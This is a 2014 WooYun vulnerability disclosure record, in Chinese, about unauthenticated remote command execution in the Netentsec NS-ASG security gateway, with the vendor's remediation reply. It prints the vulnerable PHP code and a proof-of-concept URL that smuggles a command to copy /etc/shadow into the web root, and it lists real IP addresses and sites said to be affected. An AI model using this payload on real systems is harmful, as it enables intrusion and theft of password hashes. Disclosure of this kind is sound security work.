{"id": 2577, "wybug_id": "wooyun-2014-058944", "wybug_title": "网康 NS-ASG 应用安全网关 远程命令执行", "wybug_corp": "网康科技", "wybug_author": "狗狗侠", "wybug_date": "2014-04-30 13:16", "wybug_open_date": "2014-07-29 13:18", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-29：\t细节向公众公开  简要描述：  详细说明：  无需登录，直接执行远程命令初步搜索涉及以下单位及学校：https://vpn.lib.tju.edu.cnhttps:// 211.68.223.12https://221.213.45.231https://202.113.20.208https://202.113.49.100/https://122.226.150.69https://gljy.cn等等单位….漏洞点\n<?php include(\"include/common.inc\"); include(\"./gadgets/lib/FusionCharts.php\");include(\"./gadgets/lib/Utilities.php\");//Authenticate($USER_ADMIN);switch ($action){case \"\":\tlist_group(\"\");\tbreak;case \"reboot\":\texec(\"sudo nohup /sbin/reboot &\");\tlist_group(\"\");\tbreak;case \"poweroff\":\texec(\"sudo /sbin/poweroff &\");\tlist_group(\"\");\tbreak;case \"getethinfo\":\t$rtinfo = getRT($ethx);  //这里触发漏洞，跟踪该函数\techo json_encode($rtinfo);\tbreak;}function getRT($eth='eth0'){\t$result  = shell_exec(\"sudo /sbin/ifconfig $eth\"); //这里直接执行了。。。\t$ethinfo = array();\tpreg_match(\"/RX packets:\\d+/\",$result,$rtarr);\t$ethinfo['rpackets'] = intval(substr($rtarr[0],11));\tpreg_match(\"/TX packets:\\d+/\",$result,$rtarr);\t$ethinfo['tpackets'] = intval(substr($rtarr[0],11));\tpreg_match(\"/RX bytes:\\d+/\",$result,$rtarr);\t$ethinfo['rbytes'] =intval(substr($rtarr[0],9));\tpreg_match(\"/TX bytes:\\d+/\",$result,$rtarr);\t$ethinfo['tbytes'] = intval(substr($rtarr[0],9));\treturn $ethinfo;}\n验证方式如下：https://www.xxxxx.com/admin/device_status.php?action=getethinfo&ethx=a| cat /etc/shadow > /Isc/third-party/httpd/htdocs/test.php   漏洞证明：  验证方式如下：https://www.xxxxx.com/admin/device_status.php?action=getethinfo&ethx=a| cat /etc/shadow > /Isc/third-party/httpd/htdocs/test.php   修复方案：  网康的设备是临时工写的么？   版权声明：转载请注明来源 狗狗侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-05-01 22:04 厂商回复： 4月29日，网康收到CNVD漏洞细节通知，迅速启动并同时展开了以下工作：1.进一步验证漏洞细节，目前已确认所曝漏洞确实存在于ASG产品；2.对全线产品进行安全自查，重点确认ASG产品是否仍存其它未知漏洞，并验证类似漏洞是否同存于其它产品线，截至目前，自查工作仍在进行中，全线产品暂未发现新的漏洞；3.开发用于漏洞修补的更新程序，将尽快发布应急补丁包，介时用户可通过操作设备管理界面直接安装该更新程序以对所曝漏洞进行应急性修补；4.售后服务部通过内部CRM系统导出全部ASG用户名单，并开始逐一联系用户通报漏洞情况，补丁包发布后，将再次逐一通知所有用户及时安装更新，此项工作预计3工作日内完成；5.为避免统计疏漏，工程部于4月30日16:00向CNVD共享了在线ASG设备的辨识方法，将配合CNVD共同开展在线设备的主动探测工作，一旦发现未更新补丁的在线设备，将联系并协助用户及时更新，此项工作预计10工作日内完成；6.将尽快向社会开放漏洞提交邮箱，接受第三方机构、白帽子及其它组织、个人向网康提交产品漏洞，向所有帮助网康产品进步的组织和人士表示感谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-04 23:46 |    \t\t破锁 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:6        )\t\t \n  我勒个去，你想让你的邮箱成为下一个突破口么？@厂商    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}